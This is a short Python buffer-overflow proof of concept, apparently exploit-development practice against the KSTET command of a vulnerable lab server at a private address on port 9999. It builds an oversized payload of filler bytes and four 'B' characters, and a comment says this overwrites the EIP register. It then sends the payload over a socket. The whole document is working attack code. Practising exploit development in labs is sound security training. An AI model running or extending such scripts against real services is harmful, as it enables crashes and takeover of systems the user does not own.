import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#overwrite eip BBBB or 42424242
buffer = "KSTET /.:/ " + "A"*65 + "B"*4 + "X"*4900
s.connect(('172.16.0.24',9999))
s.recv(1024)
s.send(buffer)
s.close()
